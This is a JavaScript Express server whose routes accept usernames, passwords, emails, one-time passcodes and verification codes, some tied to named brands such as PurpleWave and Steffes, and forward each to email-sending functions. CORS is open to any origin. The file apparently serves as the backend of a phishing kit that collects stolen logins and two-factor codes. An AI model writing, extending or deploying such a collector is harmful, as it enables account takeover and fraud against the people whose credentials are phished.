import express from "express";
import cors from "cors";
import dotenv from "dotenv";
import {
  sendEmail,
  sendEmailLummy,
  sendCredentials,
  sendCode,
  sendCredentialsPurpleWave,
  sendCredentialsSteffes,
} from "./services/email.mjs";

dotenv.config();

const corsOptions = {
  origin: "*",
  credentials: true,
};

const app = express();
const PORT = 3000;

app.use(cors(corsOptions));
app.use(express.json());

app.get("/", (req, res) => {
  res.send("Hello, World!");
});

app.post("/api/send-otp", async (req, res) => {
  const { otp, email } = req.body;

  await sendEmail(otp, email);

  res.json({ message: "OTP sent successfully" });
});

app.post("/api/send-form-lummy", async (req, res) => {
  const { form, email } = req.body;

  await sendEmailLummy(form, email);

  res.json({ message: "Form sent successfully" });
});

app.post("/api/send-credentials", async (req, res) => {
  const { username, password } = req.body;

  await sendCredentials(username, password);

  res.json({ message: "Credentials sent successfully" });
});

app.post("/api/send-credentials/purple-wave", async (req, res) => {
  const { username, password } = req.body;

  await sendCredentialsPurpleWave(username, password);

  res.json({ message: "Credentials sent successfully" });
});

app.post("/api/send-credentials/steffes", async (req, res) => {
  const { email, password } = req.body;

  await sendCredentialsSteffes(email, password);

  res.json({ message: "Credentials sent successfully" });
});

app.post("/api/send-code", async (req, res) => {
  const { code } = req.body;

  await sendCode(code);

  res.json({ message: "Code sent successfully" });
});

app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
